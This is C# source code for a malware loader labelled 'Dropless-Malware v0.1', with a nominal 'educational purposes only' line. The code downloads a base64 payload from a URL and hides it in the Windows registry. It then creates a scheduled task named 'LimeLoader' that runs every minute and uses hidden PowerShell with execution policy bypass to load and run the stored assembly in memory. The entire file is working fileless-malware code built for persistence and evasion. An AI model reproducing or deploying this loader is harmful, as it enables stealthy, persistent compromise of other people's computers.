using System;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;


//       │ Author     : NYAN CAT
//       │ Name       : Dropless-Malware v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.


namespace Dropless_Malware
{
    class Program
    {
        static void Main()
        {
            string Payload = DownloadPayload("http://127.0.0.1/Base64.txt");

            InstallRegistry(Payload);

            AddToSchtasks();

        }

        private static string DownloadPayload (string url)
        {
            using (WebClient wc = new WebClient())
            {
               return wc.DownloadString(url);
            }
        }

        private static void InstallRegistry(string Payload)
        {
            var reg = Registry.CurrentUser.OpenSubKey(@"Software\Dropless-Malware", true);
            if (reg == null)
            {
                reg = Registry.CurrentUser.CreateSubKey(@"Software\Dropless-Malware");
                reg.SetValue("Payload", Payload);
                return;
            }
            if (reg.GetValue("Payload") == null || !reg.GetValue("Payload").ToString().Equals(Payload, StringComparison.CurrentCultureIgnoreCase))
            {
                reg.SetValue("Payload", Payload);
                return;
            }
        }

        private static void AddToSchtasks()
        {
            string PS = @"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\Dropless-Malware\).Payload)).EntryPoint.Invoke($Null,$Null)";
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks",
                Arguments = "/create /sc minute /mo 1 /tn LimeLoader /tr " + "\"" + PS + "\"",
                CreateNoWindow = true,
                ErrorDialog = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
    }
}